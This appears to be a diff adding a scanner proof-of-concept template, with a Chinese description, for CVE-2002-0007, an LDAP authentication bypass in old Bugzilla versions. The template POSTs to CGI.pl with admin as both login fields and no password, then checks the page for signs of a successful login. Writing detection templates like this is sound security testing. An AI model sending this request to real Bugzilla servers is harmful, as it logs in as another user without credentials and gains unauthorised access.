@@ -1,0 +1,42 @@
+[info]
+author = "AVE"
+description = "检测Bugzilla 2.14.1之前版本中CGI.pl的LDAP认证绕过漏洞。通过发送不含LDAP_password字段的POST请求，CGI.pl会以空密码调用LDAP bind，导致匿名绑定成功，攻击者可绕过身份验证以任意已知用户名登录系统。"
+id = "POC-AVE-2002-0115"
+name = "Bugzilla LDAP认证绕过漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-2002-0007",
+    "bugzilla",
+    "ldap",
+    "auth-bypass",
+]
+vuln_id = [
+    "CVE-2002-0007",
+    "AVE-2002-0115",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/CGI.pl"
+protocol = "http"
+
+[poc.requests.body]
+content = "LDAP_login=admin&Bugzilla_login=admin"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Bugzilla Main Page",
+    "query.cgi",
+    "show_bug.cgi",
+]
